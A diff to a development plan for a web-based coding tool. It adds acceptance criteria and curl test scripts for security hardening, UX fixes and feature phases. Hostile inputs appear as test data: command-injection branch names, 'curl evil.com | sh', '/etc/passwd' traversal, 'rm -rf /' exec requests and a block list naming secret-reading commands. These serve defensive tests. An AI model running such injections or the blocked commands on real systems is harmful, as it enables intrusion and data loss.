@@ -54,7 +54,39 @@ const ALLOWED_DEV_PATTERNS = [
 ```
 Reject any `cfgRepo.dev` that doesn't match.
 
-**Tests:** Try switching to a branch named `test$(whoami)` — should return 400 error.
+**Acceptance Criteria:**
+- [ ] `server/sanitize.js` exists with `sanitizeBranchName()` and `sanitizePort()` exports
+- [ ] `POST /api/switch-branch` with `{ branch: "test$(whoami)" }` returns 400
+- [ ] `POST /api/switch-branch` with `{ branch: "mvp/valid-name" }` succeeds
+- [ ] `POST /api/create-branch` with `{ name: "hello; rm -rf /" }` creates a safe slug, no shell execution
+- [ ] Port injection `cfgRepo.port = "3000; whoami"` is rejected
+- [ ] `workspace.json` dev command `"npm run dev"` passes validation
+- [ ] `workspace.json` dev command `"curl evil.com | sh"` is rejected
+- [ ] All `execSync` calls in `server-washmen.js` use sanitized inputs (audit all occurrences)
+
+**Test Script:**
+```bash
+# Run from within the Codespace after implementation
+# Test 1: Malicious branch name rejected
+curl -s -X POST http://localhost:4000/api/switch-branch \
+  -H "Content-Type: application/json" \
+  -d '{"branch":"test$(whoami)"}' | grep -q "Invalid branch" && echo "PASS: injection blocked" || echo "FAIL"
+
+# Test 2: Valid branch name accepted
+curl -s -X POST http://localhost:4000/api/switch-branch \
+  -H "Content-Type: application/json" \
+  -d '{"branch":"mvp/my-feature"}' | grep -q '"ok"' && echo "PASS: valid branch works" || echo "FAIL"
+
+# Test 3: Branch with backticks rejected
+curl -s -X POST http://localhost:4000/api/switch-branch \
+  -H "Content-Type: application/json" \
+  -d '{"branch":"mvp/\`whoami\`"}' | grep -q "Invalid branch" && echo "PASS: backticks blocked" || echo "FAIL"
+
+# Test 4: Branch with semicolons rejected
+curl -s -X POST http://localhost:4000/api/switch-branch \
+  -H "Content-Type: application/json" \
+  -d '{"branch":"test; echo pwned"}' | grep -q "Invalid branch" && echo "PASS: semicolons blocked" || echo "FAIL"
+```
 
 ---
 
@@ -88,6 +120,25 @@ app.get("/api/file", (req, res) => {
 ```
 
 Import `resolve` and `sep` from `path` (already imported as `join`).
+
+**Acceptance Criteria:**
+- [ ] `GET /api/file?path=/etc/passwd` returns 403 "Access denied"
+- [ ] `GET /api/file?path=../../etc/passwd` returns 403 "Access denied"
+- [ ] `GET /api/file?path=package.json` returns the file content (within workspace)
+- [ ] `GET /api/file?path=server-washmen.js` returns the file content
+- [ ] No absolute paths outside workspace are readable
+
+**Test Script:**
+```bash
+# Test 1: Absolute path outside workspace blocked
+curl -s "http://localhost:4000/api/file?path=/etc/passwd" | grep -q "Access denied" && echo "PASS" || echo "FAIL"
+
+# Test 2: Traversal blocked
+curl -s "http://localhost:4000/api/file?path=../../../etc/passwd" | grep -q "Access denied" && echo "PASS" || echo "FAIL"
+
+# Test 3: Workspace file works
+curl -s "http://localhost:4000/api/file?path=package.json" | grep -q '"content"' && echo "PASS" || echo "FAIL"
+```
 
 ---
 
@@ -147,6 +198,31 @@ function requireAuth(req, res, next) {
 app.use("/api", requireAuth);
 ```
 
+**Acceptance Criteria:**
+- [ ] Server logs auth token on startup
+- [ ] HTML page includes `window.__VIBE_TOKEN` in a script tag
+- [ ] WebSocket connection without `?token=` param is rejected with code 4001
+- [ ] WebSocket connection with valid token succeeds
+- [ ] `GET /api/workspace` without token returns 401
+- [ ] `GET /api/workspace` with `X-Vibe-Token` header succeeds
+- [ ] Browser UI works end-to-end (token auto-sent from embedded script)
+
+**Test Script:**
+```bash
+# Test 1: API without token returns 401
+curl -s -o /dev/null -w "%{http_code}" http://localhost:4000/api/workspace
+# Expected: 401
+
+# Test 2: API with token returns 200
+TOKEN=$(curl -s http://localhost:4000 | grep -oP '__VIBE_TOKEN="([^"]+)"' | cut -d'"' -f2)
+curl -s -o /dev/null -w "%{http_code}" -H "X-Vibe-Token: $TOKEN" http://localhost:4000/api/workspace
+# Expected: 200
+
+# Test 3: WebSocket without token (use wscat)
+# wscat -c ws://localhost:4000/ws → should disconnect immediately
+# wscat -c "ws://localhost:4000/ws?token=$TOKEN" → should connect
+```
+
 ---
 
 ### 1.4 Harden `/api/exec` Endpoint
@@ -188,6 +264,31 @@ router.post("/", (req, res) => {
   }
   // ... rest of handler
 });
+```
+
+**Acceptance Criteria:**
+- [ ] `POST /api/exec` with `{ command: "git status" }` succeeds
+- [ ] `POST /api/exec` with `{ command: "rm -rf /" }` returns 403 "Command not allowed"
+- [ ] `POST /api/exec` with `{ command: "node -e 'process.exit(1)'" }` returns 403
+- [ ] `POST /api/exec` with `{ cwd: "/etc" }` returns 403 "cwd outside workspace"
+- [ ] `POST /api/exec` with `{ command: "ls", cwd: "/workspaces/..." }` succeeds
+
+**Test Script:**
+```bash
+# Test 1: Allowed command
+curl -s -X POST http://localhost:4000/api/exec \
+  -H "Content-Type: application/json" \
+  -d '{"command":"git status"}' | grep -q "stdout" && echo "PASS" || echo "FAIL"
+
+# Test 2: Blocked command
+curl -s -X POST http://localhost:4000/api/exec \
+  -H "Content-Type: application/json" \
+  -d '{"command":"rm -rf /"}' | grep -q "not allowed" && echo "PASS" || echo "FAIL"
+
+# Test 3: CWD escape blocked
+curl -s -X POST http://localhost:4000/api/exec \
+  -H "Content-Type: application/json" \
+  -d '{"command":"ls","cwd":"/etc"}' | grep -q "outside workspace" && echo "PASS" || echo "FAIL"
 ```
 
 ---
@@ -238,6 +339,24 @@ const BLOCKED_FILE_PATTERNS = [
   /workspace\.json$/i,                     // prevent config tampering
 ];
 ```
+
+**Acceptance Criteria:**
+- [ ] `BLOCKED_BASH_PATTERNS` includes `sudo`, `rm -rf`, `curl|sh`, `chmod`, `env`, `printenv`, `/etc/`, `/proc/`, `.env`
+- [ ] `BLOCKED_FILE_PATTERNS` includes `.env`, `credentials`, `secrets`, `.pem`, `.key`, `package.json`, `workspace.json`
+- [ ] Agent sending `Bash` tool with command `cat .env` is blocked
+- [ ] Agent sending `Bash` tool with command `sudo apt install` is blocked
+- [ ] Agent sending `Edit` tool targeting `.env` file is blocked
+- [ ] Agent sending `Edit` tool targeting `src/pages/Home.jsx` is allowed
+- [ ] Agent sending `Bash` tool with `npm test` is allowed
+
+**Test Steps (manual via chat):**
+1. Start a build session on a feature branch
+2. Ask the AI: "Read the contents of .env file using bash"
+3. Verify: AI should be blocked by guardrails, user sees a "Blocked" message
+4. Ask the AI: "Edit the package.json to add a new dependency"
+5. Verify: AI should be blocked from editing package.json
+6. Ask the AI: "Create a new React component at src/components/Test.jsx"
+7. Verify: AI should be allowed to create the file
 
 ---
 
@@ -1025,18 +1144,209 @@ This allows the app shell to load even when the network is briefly unavailable (
 
 ---
 
+## Acceptance Criteria & Test Plans
+
+### Phase 2 Acceptance Criteria
+
+**2.1 Fix Session Titles:**
+- [ ] New sessions have `title` column populated with first 80 chars of user message
+- [ ] `/api/workspace` response includes `session.title` for each branch
+- [ ] Landing screen displays session title under branch name
+- [ ] Existing sessions without titles show branch name as fallback
+- [ ] HTML characters in title are escaped (no XSS)
+
+Test: Send a chat message "Build a customer list page with search and filters". Check DB: `SELECT title FROM sessions ORDER BY last_used_at DESC LIMIT 1` — should show the message. Check landing page: branch card should display the title text.
+
+**2.2 Per-Turn Budget Enforcement:**
+- [ ] Daily budget check happens after each `addCost()` call, not just at query start
+- [ ] When daily budget is exceeded mid-session, user receives a system message
+- [ ] SDK `maxBudgetUsd` still enforced per query ($5)
+- [ ] Budget message includes current spend and limit
+
+Test: Set `DAILY_BUDGET = 0.01` temporarily. Send two messages. Second message should trigger budget exceeded warning.
+
+**2.3 Process Management & Log Rotation:**
+- [ ] Log files are truncated before service restart (not appended indefinitely)
+- [ ] `logPositions` object cleans up entries for deleted files
+- [ ] `browserConsoleBuffer` capped at 100 entries (was 200)
+- [ ] `spawn()` error events logged and broadcast to client
+- [ ] No zombie processes after multiple branch switches
+
+Test: Switch branches 3 times. Check `/tmp/*.log` files aren't growing beyond one restart cycle. Check `ps aux | grep node` for orphaned processes.
+
+**2.4 Fix Markdown Streaming Performance:**
+- [ ] `requestAnimationFrame` used to batch streaming chunk renders
+- [ ] No visible rendering difference to user (text still streams smoothly)
+- [ ] Code highlighting and copy buttons still applied correctly
+- [ ] Long responses (>5000 chars) render without browser jank
+- [ ] Final render (streaming=false) still triggers full parse
+
+Test: Ask AI to "write a 500-line React component". During streaming, open browser DevTools Performance tab. Verify no continuous layout thrashing. Compare with before: should see fewer paint events.
+
+**2.5 Fix Event Listener Leaks in Parallel Mode:**
+- [ ] Each pane uses `AbortController` with `{ signal }` on all event listeners
+- [ ] `exitParallelMode()` calls `abort()` on each pane's controller
+- [ ] Toggle parallel mode on/off 5 times — no increase in memory or listener count
+- [ ] Pane functionality (send, stop, keydown, input) works correctly while active
+
+Test: Open DevTools → Memory → Take heap snapshot. Toggle parallel mode 5 times. Take another snapshot. Compare listener counts — should be identical.
+
+**2.6 Eliminate Silent Failures:**
+- [ ] All empty `catch {}` blocks replaced with `catch (e) { console.warn(...) }`
+- [ ] Priority blocks (lines 192, 204, 266, 305) include descriptive context
+- [ ] Server logs show warnings when git operations fail
+- [ ] No functional changes — same behavior, just visible logging
+
+Test: Check `journalctl` or server stdout during normal operation. Should see structured `[context]` log entries instead of silence.
+
+---
+
+### Phase 3 Acceptance Criteria
+
+**3.1 Wire Guided Tour to index-v2.html:**
+- [ ] Welcome overlay appears on first visit (check localStorage `claudeck-welcome-seen`)
+- [ ] "Get Started" button dismisses overlay and shows landing
+- [ ] "Take a Tour" button dismisses overlay and starts Driver.js tour
+- [ ] Tour highlights correct v2 elements (home-btn, mode-toggle, model-picker, attach-btn, input, send-btn)
+- [ ] Tour steps that reference non-existent v2 elements are removed
+- [ ] Welcome doesn't appear on subsequent visits (localStorage persisted)
+- [ ] Clearing localStorage `claudeck-welcome-seen` brings welcome back
+
+Test: Open incognito browser → navigate to vibe-ui. Welcome overlay should appear. Click "Take a Tour" → tour should highlight real UI elements. Close tour → landing screen shows. Refresh page → welcome should NOT appear again.
+
+**3.2 Add ARIA Labels & Focus Traps:**
+- [ ] Status overlay has `role="dialog"` and `aria-modal="true"`
+- [ ] Notes overlay has `role="dialog"` and `aria-modal="true"`
+- [ ] Chat area has `aria-live="polite"` and `role="log"`
+- [ ] `public/js/utils/focus-trap.js` exists and exports `trapFocus()`
+- [ ] Tab key cycles within open overlays (doesn't escape to background)
+- [ ] Escape closes overlay and returns focus to trigger element
+- [ ] Screen reader (VoiceOver) announces new chat messages
+
+Test: Open Status overlay. Press Tab repeatedly — focus should cycle within the overlay. Press Escape — overlay closes. Enable VoiceOver on macOS. Send a message — response should be announced.
+
+**3.3 Consolidate HTML Entry Points:**
+- [ ] `index.html` renamed to `index-legacy.html` with deprecation comment
+- [ ] `washmen.html` renamed to `washmen-legacy.html` with deprecation comment
+- [ ] `/v1` route redirects to `/` (HTTP 302)
+- [ ] Main app at `/` still serves `index-v2.html` correctly
+- [ ] No broken imports or references to old filenames
+
+Test: `curl -sI http://localhost:4000/v1 | grep Location` should show redirect. Main app should load normally.
+
+**3.4 Preview Error State UI:**
+- [ ] After 30 failed health polls, preview shows error message (not blank/spinner)
+- [ ] Error state includes "Services not ready" title and description
+- [ ] Retry button is visible and functional
+- [ ] Clicking Retry restarts the health polling cycle
+- [ ] When services eventually come up, preview loads correctly
+- [ ] CSS for `.preview-error` classes exists in styles.css
+
+Test: Stop the frontend service (`kill $(lsof -ti:3000)`). Switch branches. Preview should show loading, then after 30s show error state with Retry button. Restart frontend. Click Retry → preview loads.
+
+---
+
+### Phase 4 Acceptance Criteria
+
+**4.1 Branch Summary on Landing:**
+- [ ] `/api/workspace` response includes `commitCount`, `lastCommitMsg`, `filesChanged` per branch
+- [ ] Landing branch cards show commit count and file count
+- [ ] Last commit message displayed under branch name (truncated to 100 chars)
+- [ ] Branches with 0 commits show no stats (clean display)
+- [ ] Remote-only branches show available stats or "remote" label
+- [ ] Git commands use sanitized branch names (from 1.1)
+
+Test: Create a branch, make 3 commits changing 5 files. Go Home. Branch card should show "3 commits · 5 files" and the last commit message. New branch with no commits should show no stats.
+
+**4.2 Cost Breakdown Per Branch:**
+- [ ] `getBranchCosts()` function exists in `db.js` and returns cost per branch
+- [ ] `/api/workspace` response includes `cost` field per branch
+- [ ] Landing branch cards show cost (e.g., "$0.42") when > 0
+- [ ] Cost is formatted to 2 decimal places
+- [ ] Branches with $0 cost show no cost badge
+- [ ] Total landing budget still shows correctly
+
+Test: Use a feature branch, send several messages (accumulate cost). Go Home. Branch card should show the accumulated cost. Verify: `SUM(cost)` in landing budget matches individual branch costs.
+
+**4.3 Collaborative Awareness:**
+- [ ] `sessions` table has `codespace_id` column
+- [ ] `createSession()` accepts and stores `codespaceId` parameter
+- [ ] Session creation captures `CODESPACE_NAME` env var (or hostname fallback)
+- [ ] `/api/workspace` response includes `session.codespace` per branch
+- [ ] Landing branch cards show Codespace name badge when available
+- [ ] Different Codespaces create sessions with different `codespace_id` values
+
+Test: On Codespace A, create a session on branch X. On Codespace B, check `/api/workspace` — branch X should show `codespace: "codespace-a-name"`. On Codespace B, create a session on branch Y — should show Codespace B's name.
+
+**4.4 Auto-Generate Branch Notes on Switch:**
+- [ ] Switching from `mvp/feature-x` to `mvp/feature-y` auto-generates notes for `feature-x`
+- [ ] Notes include git log (commit list) and diff stat (files changed)
+- [ ] "Saving branch notes" step appears in switch progress overlay
+- [ ] Notes saved to `branch_notes` table with correct branch name
+- [ ] Existing manually-written notes are NOT overwritten (only if notes are empty)
+- [ ] Switching to the same branch doesn't trigger note generation
+- [ ] Note generation failure doesn't block branch switch
+
+Test: Work on feature-x (make commits). Switch to feature-y. Go to feature-x notes overlay — should show auto-generated summary with commits and file changes. Manually edit notes. Switch away and back — manual notes should be preserved.
+
+**4.5 Agent Activity Timeline:**
+- [ ] `activity_events` table exists with columns: session_id, event_type, tool, input_summary, created_at
+- [ ] PreToolUse hook inserts `tool_start` events
+- [ ] PostToolUse hook inserts `tool_end` events
+- [ ] `GET /api/sessions/:id/timeline` returns ordered activity events
+- [ ] Frontend shows collapsible "View activity" after each assistant response
+- [ ] Timeline renders tool icons in sequence (Read → Edit → Bash → etc.)
+- [ ] `input_summary` truncated to 200 chars
+
+Test: Send a message that triggers multiple tools (e.g., "Read the package.json and add a test script"). After response, click "View activity". Should show: 📄 Read → ✎ Edit sequence. Check API: `GET /api/sessions/{id}/timeline` returns matching events.
+
+**4.6 Undo Last Turn:**
+- [ ] `undoLastTurn()` function exists in `db.js`
+- [ ] `POST /api/sessions/:id/undo` endpoint deletes last user+assistant message pair
+- [ ] Endpoint returns updated message list
+- [ ] Undo button appears in chat UI after each assistant response
+- [ ] Clicking Undo removes last exchange from chat and DB
+- [ ] Undo on empty chat does nothing (no error)
+- [ ] Multiple undos work (can undo several turns)
+
+Test: Send 3 messages. Click Undo — last exchange removed from UI and DB. Click Undo again — second exchange removed. Refresh page, resume branch — only first exchange should load.
+
+**4.7 Offline/PWA Completion:**
+- [ ] Service worker pre-caches app shell files (styles.css, app.js, component JS)
+- [ ] Going offline shows cached app shell (not browser error)
+- [ ] Coming back online resumes normal operation
+- [ ] Service worker updates when new version deployed
+- [ ] API calls still fail gracefully when offline (not cached)
+
+Test: Load the app. Go offline (DevTools → Network → Offline). Refresh — should show app shell with offline indicator. Go back online — app reconnects.
+
+---
+
 ## Execution Order for Claude Loop
 
-Run these in order. Each phase can be a separate loop iteration:
+Run these in order. Each phase can be a separate loop iteration.
+
+**IMPORTANT:** After implementing each item, run its test script/steps. Do NOT proceed to the next item if tests fail. Fix failures before moving on.
 
 ```
-Phase 1 (Security):  1.1 → 1.2 → 1.3 → 1.4 → 1.5
-Phase 2 (Reliability): 2.1 → 2.2 → 2.3 → 2.4 → 2.5 → 2.6
-Phase 3 (UX):  3.1 → 3.2 → 3.3 → 3.4
-Phase 4 (Features): 4.1 → 4.2 → 4.3 → 4.4 → 4.5 → 4.6 → 4.7
+Phase 1 (Security):     1.1 → 1.2 → 1.3 → 1.4 → 1.5
+Phase 2 (Reliability):  2.1 → 2.2 → 2.3 → 2.4 → 2.5 → 2.6
+Phase 3 (UX):           3.1 → 3.2 → 3.3 → 3.4
+Phase 4 (Features):     4.1 → 4.2 → 4.3 → 4.4 → 4.5 → 4.6 → 4.7
 ```
 
-Each item is self-contained with:
-- Exact file paths and line numbers
-- Code snippets ready to implement
-- Clear acceptance criteria (what to test)
+**Per-item workflow:**
+1. Read the spec for the item
+2. Read all referenced files at the specified line numbers
+3. Implement the changes
+4. Run the test script (if bash-testable) or verify the acceptance criteria
+5. Commit with descriptive message: `[phase.item] Title — description`
+6. Push to origin/main
+7. Move to next item
+
+**Commit message format:**
+```
+[1.1] Sanitize shell inputs — add server/sanitize.js, validate branch names and ports
+[2.4] Fix markdown streaming — batch renders with requestAnimationFrame
+[4.1] Branch summary on landing — show commit count, files changed, last commit message
+```
